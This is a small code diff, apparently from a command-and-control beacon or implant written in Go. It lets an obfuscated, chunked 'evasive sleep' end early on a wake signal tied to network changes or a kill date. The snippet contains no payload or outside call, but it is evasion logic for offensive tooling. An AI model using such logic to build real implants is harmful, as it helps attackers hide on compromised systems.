@@ -32,6 +32,14 @@ func sleepObfuscated(total time.Duration) {
 		time.Sleep(chunk)
 		remaining -= chunk
 
+		// A confirmed network change (or ghost/kill-date wake) must not wait
+		// out the rest of a long evasive sleep.
+		select {
+		case <-beaconWakeCh:
+			return
+		default:
+		}
+
 		if remaining <= 0 {
 			break
 		}
